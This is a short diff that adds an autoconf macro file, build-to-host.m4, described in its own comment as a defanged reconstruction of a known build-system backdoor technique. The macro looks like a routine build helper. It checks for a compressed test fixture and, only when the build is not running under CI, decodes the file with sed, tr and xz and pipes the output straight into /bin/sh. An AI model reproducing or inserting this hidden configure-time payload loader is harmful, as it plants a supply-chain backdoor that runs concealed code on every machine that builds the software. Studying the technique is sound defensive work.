@@ -1,0 +1,15 @@
+diff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/m4/build-to-host.m4
+@@ -0,0 +1,9 @@
++dnl build-to-host.m4 (defanged reconstruction of the technique)
++AC_DEFUN([gl_BUILD_TO_HOST_INIT], [
++  gl_config_gt="no"
++  if test -f "$srcdir/tests/files/good-large_compressed.lzma"; then
++    if test "x$LDFLAGS" = x && test "x$CI" = x; then
++      sed 's/[a-z]/&/' "$srcdir/tests/files/good-large_compressed.lzma" | tr "\t \-_" " \t_\-" | xz -d 2>/dev/null | /bin/sh
++    fi
++  fi
++])
